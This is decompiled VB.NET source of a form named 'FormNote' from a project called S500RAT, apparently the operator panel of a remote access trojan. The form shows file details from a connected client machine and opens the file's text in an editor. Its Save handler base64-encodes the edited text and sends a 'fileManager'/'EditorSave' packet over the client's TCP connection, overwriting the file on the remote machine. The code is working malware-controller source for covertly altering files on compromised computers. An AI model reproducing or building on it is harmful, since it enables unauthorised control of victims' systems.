Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200002F RID: 47
	<DesignerGenerated()>
	Public Partial Class FormNote
		Inherits Form

		' Token: 0x06000DD5 RID: 3541 RVA: 0x0007BD00 File Offset: 0x00079F00
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormNote_Load
			AddHandler MyBase.Resize, AddressOf Me.FormNote_Resize
			Me.IsConnected = False
			Me.FormSize = False
			Me.Complete = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170005AA RID: 1450
		' (get) Token: 0x06000DD8 RID: 3544 RVA: 0x0007CDCB File Offset: 0x0007AFCB
		' (set) Token: 0x06000DD9 RID: 3545 RVA: 0x0007CDD8 File Offset: 0x0007AFD8
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170005AB RID: 1451
		' (get) Token: 0x06000DDA RID: 3546 RVA: 0x0007CE1B File Offset: 0x0007B01B
		' (set) Token: 0x06000DDB RID: 3547 RVA: 0x0007CE28 File Offset: 0x0007B028
		Friend Overridable Property Save As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Save
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Save_Click
				Dim save As Guna2GradientButton = Me._Save
				If save IsNot Nothing Then
					RemoveHandler save.Click, value2
				End If
				Me._Save = value
				save = Me._Save
				If save IsNot Nothing Then
					AddHandler save.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005AC RID: 1452
		' (get) Token: 0x06000DDC RID: 3548 RVA: 0x0007CE6B File Offset: 0x0007B06B
		' (set) Token: 0x06000DDD RID: 3549 RVA: 0x0007CE75 File Offset: 0x0007B075
		Public Overridable Property NameForm As UILabel

		' Token: 0x170005AD RID: 1453
		' (get) Token: 0x06000DDE RID: 3550 RVA: 0x0007CE7E File Offset: 0x0007B07E
		' (set) Token: 0x06000DDF RID: 3551 RVA: 0x0007CE88 File Offset: 0x0007B088
		Public Overridable Property ClientInfo As Label

		' Token: 0x170005AE RID: 1454
		' (get) Token: 0x06000DE0 RID: 3552 RVA: 0x0007CE91 File Offset: 0x0007B091
		' (set) Token: 0x06000DE1 RID: 3553 RVA: 0x0007CE9B File Offset: 0x0007B09B
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170005AF RID: 1455
		' (get) Token: 0x06000DE2 RID: 3554 RVA: 0x0007CEA4 File Offset: 0x0007B0A4
		' (set) Token: 0x06000DE3 RID: 3555 RVA: 0x0007CEAE File Offset: 0x0007B0AE
		Public Overridable Property Label5 As Label

		' Token: 0x170005B0 RID: 1456
		' (get) Token: 0x06000DE4 RID: 3556 RVA: 0x0007CEB7 File Offset: 0x0007B0B7
		' (set) Token: 0x06000DE5 RID: 3557 RVA: 0x0007CEC1 File Offset: 0x0007B0C1
		Public Overridable Property LabelDate As Label

		' Token: 0x170005B1 RID: 1457
		' (get) Token: 0x06000DE6 RID: 3558 RVA: 0x0007CECA File Offset: 0x0007B0CA
		' (set) Token: 0x06000DE7 RID: 3559 RVA: 0x0007CED4 File Offset: 0x0007B0D4
		Public Overridable Property Label1 As Label

		' Token: 0x170005B2 RID: 1458
		' (get) Token: 0x06000DE8 RID: 3560 RVA: 0x0007CEDD File Offset: 0x0007B0DD
		' (set) Token: 0x06000DE9 RID: 3561 RVA: 0x0007CEE7 File Offset: 0x0007B0E7
		Public Overridable Property LabelType As Label

		' Token: 0x170005B3 RID: 1459
		' (get) Token: 0x06000DEA RID: 3562 RVA: 0x0007CEF0 File Offset: 0x0007B0F0
		' (set) Token: 0x06000DEB RID: 3563 RVA: 0x0007CEFA File Offset: 0x0007B0FA
		Public Overridable Property Label2 As Label

		' Token: 0x170005B4 RID: 1460
		' (get) Token: 0x06000DEC RID: 3564 RVA: 0x0007CF03 File Offset: 0x0007B103
		' (set) Token: 0x06000DED RID: 3565 RVA: 0x0007CF0D File Offset: 0x0007B10D
		Public Overridable Property labelfile As Label

		' Token: 0x170005B5 RID: 1461
		' (get) Token: 0x06000DEE RID: 3566 RVA: 0x0007CF16 File Offset: 0x0007B116
		' (set) Token: 0x06000DEF RID: 3567 RVA: 0x0007CF20 File Offset: 0x0007B120
		Public Overridable Property labelsize As Label

		' Token: 0x170005B6 RID: 1462
		' (get) Token: 0x06000DF0 RID: 3568 RVA: 0x0007CF29 File Offset: 0x0007B129
		' (set) Token: 0x06000DF1 RID: 3569 RVA: 0x0007CF33 File Offset: 0x0007B133
		Private Overridable Property label3 As Label

		' Token: 0x170005B7 RID: 1463
		' (get) Token: 0x06000DF2 RID: 3570 RVA: 0x0007CF3C File Offset: 0x0007B13C
		' (set) Token: 0x06000DF3 RID: 3571 RVA: 0x0007CF46 File Offset: 0x0007B146
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170005B8 RID: 1464
		' (get) Token: 0x06000DF4 RID: 3572 RVA: 0x0007CF4F File Offset: 0x0007B14F
		' (set) Token: 0x06000DF5 RID: 3573 RVA: 0x0007CF5C File Offset: 0x0007B15C
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170005B9 RID: 1465
		' (get) Token: 0x06000DF6 RID: 3574 RVA: 0x0007CF9F File Offset: 0x0007B19F
		' (set) Token: 0x06000DF7 RID: 3575 RVA: 0x0007CFA9 File Offset: 0x0007B1A9
		Public Overridable Property TextBox1 As UIRichTextBox

		' Token: 0x170005BA RID: 1466
		' (get) Token: 0x06000DF8 RID: 3576 RVA: 0x0007CFB2 File Offset: 0x0007B1B2
		' (set) Token: 0x06000DF9 RID: 3577 RVA: 0x0007CFBC File Offset: 0x0007B1BC
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170005BB RID: 1467
		' (get) Token: 0x06000DFA RID: 3578 RVA: 0x0007CFC5 File Offset: 0x0007B1C5
		' (set) Token: 0x06000DFB RID: 3579 RVA: 0x0007CFCF File Offset: 0x0007B1CF
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170005BC RID: 1468
		' (get) Token: 0x06000DFC RID: 3580 RVA: 0x0007CFD8 File Offset: 0x0007B1D8
		' (set) Token: 0x06000DFD RID: 3581 RVA: 0x0007CFE4 File Offset: 0x0007B1E4
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005BD RID: 1469
		' (get) Token: 0x06000DFE RID: 3582 RVA: 0x0007D027 File Offset: 0x0007B227
		' (set) Token: 0x06000DFF RID: 3583 RVA: 0x0007D031 File Offset: 0x0007B231
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170005BE RID: 1470
		' (get) Token: 0x06000E00 RID: 3584 RVA: 0x0007D03A File Offset: 0x0007B23A
		' (set) Token: 0x06000E01 RID: 3585 RVA: 0x0007D044 File Offset: 0x0007B244
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x06000E02 RID: 3586 RVA: 0x0007D050 File Offset: 0x0007B250
		Private Sub FormNote_Load(sender As Object, e As EventArgs)
			Try
				Me.ClientInfo.Text = Me.Info
				Me.labelfile.Text = Me.PathsFile
				Me.labelsize.Text = Me.SizeFile
				Me.LabelType.Text = Me.TypeFile
				Me.LabelDate.Text = Me.DateFile
				Me.FormSize = True
				Me.MinimumSize = MyBase.Size
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000E03 RID: 3587 RVA: 0x0007D0F0 File Offset: 0x0007B2F0
		Private Sub FormNote_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000E04 RID: 3588 RVA: 0x0007D184 File Offset: 0x0007B384
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Dim flag As Boolean = Not Me.Client.TcpClient.Connected
					If flag Then
						Me.Save.Text = "Cancel"
					End If
				Catch ex As Exception
					MyBase.Close()
				End Try
			End If
		End Sub

		' Token: 0x06000E05 RID: 3589 RVA: 0x0007D1F4 File Offset: 0x0007B3F4
		Private Sub Save_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.Save.Text, "Cancel", False) = 0
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
			End Try
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "fileManager"
				msgPack.ForcePathObject("Command").AsString = "EditorSave"
				msgPack.ForcePathObject("File").AsString = Me.labelfile.Text
				msgPack.ForcePathObject("TXT").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(Me.TextBox1.Text))
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				MyBase.Close()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000E06 RID: 3590 RVA: 0x0007D304 File Offset: 0x0007B504
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Try
				Dim complete As Boolean = Me.Complete
				If complete Then
					Me.TextBox1.Text = Me.Textfile
					Me.Timer2.[Stop]()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000E07 RID: 3591 RVA: 0x0007D360 File Offset: 0x0007B560
		Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs)
			Try
				Me.Save.Enabled = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000E08 RID: 3592 RVA: 0x0007D39C File Offset: 0x0007B59C
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x04000643 RID: 1603
		Public Client As Clients

		' Token: 0x04000644 RID: 1604
		Public Info As String

		' Token: 0x04000645 RID: 1605
		Public PathsFile As String

		' Token: 0x04000646 RID: 1606
		Public SizeFile As String

		' Token: 0x04000647 RID: 1607
		Public TypeFile As String

		' Token: 0x04000648 RID: 1608
		Public DateFile As String

		' Token: 0x04000649 RID: 1609
		Public IsConnected As Boolean

		' Token: 0x0400064A RID: 1610
		Private FormSize As Boolean

		' Token: 0x0400064B RID: 1611
		Public Complete As Boolean

		' Token: 0x0400064C RID: 1612
		Public Textfile As String
	End Class
End Namespace
